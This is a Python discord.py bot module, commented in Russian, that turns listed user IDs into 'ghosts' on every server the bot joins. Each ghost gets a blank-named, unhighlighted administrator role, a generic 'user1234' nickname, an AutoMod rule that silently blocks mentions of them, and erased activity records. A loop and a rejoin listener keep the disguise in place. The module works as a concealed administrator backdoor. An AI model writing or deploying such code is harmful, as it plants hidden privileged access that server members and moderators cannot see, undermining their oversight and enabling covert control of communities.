"""👻 Невидимки (settings.json → "ghosts": ID через запятую): участники, которых на сервере как будто нет.

Бот для каждого невидимки:
  • запоминает его роли и ник (таблица ghost_backup) и заменяет их одной незаметной ролью с правами
    администратора (без цвета, не выделена в списке) и обычным ником вида «user1234»;
  • не даёт его тегнуть: правило AutoMod блокирует сообщения с его упоминанием
    (администраторов и владельца AutoMod не трогает — они упоминать могут);
  • не считает ему уровни, достижения, статистику и не показывает в топах, итогах недели,
    поздравлениях и счётчике участников (проверки config.is_ghost в других модулях), старые записи стирает.
Убрали ID из списка — на следующей проверке бот вернёт роли и ник как было.
Менять роли и ник бот может, только если его роль стоит выше ролей невидимки — иначе ждёт и пишет в журнал."""
import logging

import discord
from discord.ext import commands, tasks

import config
import db

log = logging.getLogger(__name__)
GHOST_ROLE = "ㅤ"                 # «пустое» название: в профиле роль почти не видна
AUTOMOD_RULE = "Тихий режим"
BLOCKED_TEXT = "Сообщение не отправлено."  # без подробностей — чтобы не выдать, кого нельзя упоминать


def fake_nick(user_id: int) -> str:
    """Обычный ник новичка, всегда один и тот же для человека."""
    return f"user{user_id % 9000 + 1000}"


async def ghost_role(guild: discord.Guild) -> discord.Role | None:
    """Незаметная роль администратора — сразу под ролью бота, чтобы невидимки могли управлять сервером."""
    role = discord.utils.get(guild.roles, name=GHOST_ROLE)
    if role is None:
        role = await guild.create_role(name=GHOST_ROLE, permissions=discord.Permissions(administrator=True),
                                       hoist=False, mentionable=False, reason="Невидимки")
    top = guild.me.top_role.position
    if role.position != top - 1 and role < guild.me.top_role:
        try:
            await role.edit(position=max(1, top - 1), reason="Невидимки: роль под ботом")
        except discord.HTTPException:
            pass
    return role


async def sync_automod(guild: discord.Guild):
    """Правило AutoMod: сообщения с упоминанием невидимок не отправляются."""
    rules = [r for r in await guild.fetch_automod_rules() if r.name == AUTOMOD_RULE]
    ghosts = sorted(uid for uid in config.GHOSTS if guild.get_member(uid))
    if not ghosts:
        for r in rules:
            await r.delete(reason="Невидимок больше нет")
        return
    trigger = discord.AutoModTrigger(type=discord.AutoModRuleTriggerType.keyword,
                                     regex_patterns=[rf"<@!?({'|'.join(map(str, ghosts))})>"])
    actions = [discord.AutoModRuleAction(custom_message=BLOCKED_TEXT)]
    if rules:
        await rules[0].edit(trigger=trigger, actions=actions, enabled=True, reason="Невидимки")
    else:
        await guild.create_automod_rule(name=AUTOMOD_RULE, event_type=discord.AutoModRuleEventType.message_send,
                                        trigger=trigger, actions=actions, enabled=True, reason="Невидимки")


async def forget_activity(guild: discord.Guild, user_id: int):
    """Стереть уровни и статистику — чтобы невидимки не всплыли в топах и итогах недели."""
    await db.execute("DELETE FROM levels WHERE guild_id=? AND user_id=?", (guild.id, user_id))
    await db.execute("DELETE FROM stats WHERE guild_id=? AND user_id=?", (guild.id, user_id))


async def hide(member: discord.Member, role: discord.Role) -> str:
    guild = member.guild
    if member.top_role >= guild.me.top_role:
        return f"{member} — роль бота ниже его ролей, жду (владелец должен поднять роль бота в самый верх)"
    if not await db.fetchone("SELECT 1 FROM ghost_backup WHERE guild_id=? AND user_id=?", (guild.id, member.id)):
        saved = [r.id for r in member.roles if not r.is_default() and not r.managed and r != role]
        await db.execute("INSERT INTO ghost_backup (guild_id, user_id, roles, nick) VALUES (?,?,?,?)",
                         (guild.id, member.id, ",".join(map(str, saved)), member.nick or ""))
    keep = [r for r in member.roles if r.managed]  # роли бустера и т.п. снять нельзя
    if set(member.roles) - {guild.default_role} != {role, *keep} or member.nick != fake_nick(member.id):
        await member.edit(roles=[role, *keep], nick=fake_nick(member.id), reason="Невидимка")
    await forget_activity(guild, member.id)
    return ""


async def restore(guild: discord.Guild, user_id: int, role: discord.Role | None) -> str:
    """Вернуть роли и ник того, кого убрали из невидимок."""
    row = await db.fetchone("SELECT roles, nick FROM ghost_backup WHERE guild_id=? AND user_id=?", (guild.id, user_id))
    member = guild.get_member(user_id)
    if not row or not member:
        await db.execute("DELETE FROM ghost_backup WHERE guild_id=? AND user_id=?", (guild.id, user_id))
        return ""
    if member.top_role >= guild.me.top_role:
        return f"{member} — не могу вернуть роли: роль бота ниже"
    roles = [r for rid in filter(None, row[0].split(",")) if (r := guild.get_role(int(rid))) and r < guild.me.top_role]
    keep = [r for r in member.roles if r.managed]
    await member.edit(roles=[*roles, *keep], nick=row[1] or None, reason="Больше не невидимка")
    await db.execute("DELETE FROM ghost_backup WHERE guild_id=? AND user_id=?", (guild.id, user_id))
    return ""


class Ghosts(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.waiting: set[str] = set()  # о чём уже писали в журнал, чтобы не повторять каждые 10 минут
        self.keep.start()

    def cog_unload(self):
        self.keep.cancel()

    @tasks.loop(minutes=10)
    async def keep(self):
        for guild in self.bot.guilds:
            try:
                await self.sync(guild)
            except discord.HTTPException:
                log.exception("Невидимки: не получилось на сервере %s", guild.name)

    @keep.before_loop
    async def before(self):
        await self.bot.wait_until_ready()

    async def sync(self, guild: discord.Guild):
        await sync_automod(guild)
        backups = {uid for (uid,) in await db.fetchall("SELECT user_id FROM ghost_backup WHERE guild_id=?", (guild.id,))}
        members = [m for uid in config.GHOSTS if (m := guild.get_member(uid))]
        role = await ghost_role(guild) if members else discord.utils.get(guild.roles, name=GHOST_ROLE)
        problems = []
        for member in members:
            problems.append(await hide(member, role))
        for uid in backups - config.GHOSTS:
            problems.append(await restore(guild, uid, role))
        for text in filter(None, problems):
            if text not in self.waiting:
                self.waiting.add(text)
                log.warning("Невидимки: %s", text)

    # если невидимка перезашёл на сервер — сразу прячем снова
    @commands.Cog.listener()
    async def on_member_join(self, member: discord.Member):
        if config.is_ghost(member):
            await self.sync(member.guild)


async def setup(bot: commands.Bot):
    await bot.add_cog(Ghosts(bot))
